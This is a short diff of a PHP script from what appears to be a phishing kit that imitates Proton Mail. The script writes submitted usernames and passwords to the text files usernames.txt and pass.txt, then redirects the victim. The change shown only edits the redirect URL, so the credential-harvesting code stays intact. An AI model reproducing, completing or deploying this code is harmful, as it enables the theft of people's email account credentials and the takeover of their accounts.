@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "Proton Mail Username : " . $email = $_POST['
 ?>
 <?php
 file_put_contents("pass.txt", "Proton Mail Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
